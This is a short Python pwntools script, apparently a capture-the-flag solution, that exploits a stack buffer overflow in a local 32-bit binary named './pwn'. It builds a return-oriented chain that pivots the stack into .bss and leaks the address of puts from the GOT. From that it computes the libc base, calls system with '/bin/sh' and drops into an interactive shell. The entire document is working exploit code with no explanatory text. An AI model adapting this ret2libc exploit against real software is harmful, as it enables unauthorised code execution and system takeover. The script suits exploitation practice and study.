from pwn import *
name = "./pwn"
elf = ELF(name)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
context.log_level='debug'
p = process(name)
puts_plt = 0x8048390 
puts_got = 0x8049ff0
pop_ret = 0x804836d
leave_ret = 0x8048418
bss_addr = 0x804ae00
ret_addr = 0x08048356
read_plt = 0x8048380
p.recvuntil(b":")
payload = b"a"*40 
payload += flat([bss_addr,puts_plt,pop_ret,puts_got,read_plt,leave_ret,0,bss_addr,100])
p.send(payload)
leak_data = p.recv(4)
libc_addr = u32(leak_data) - libc.symbols["puts"]
success("Leak data: " + str(leak_data)) 
success("Libc Base: " + hex(libc_addr))
system_addr = libc_addr + libc.symbols["system"]
payload1 = flat([0,system_addr,0,bss_addr+4*4,b"/bin/sh"])
p.send(payload1)
p.interactive()

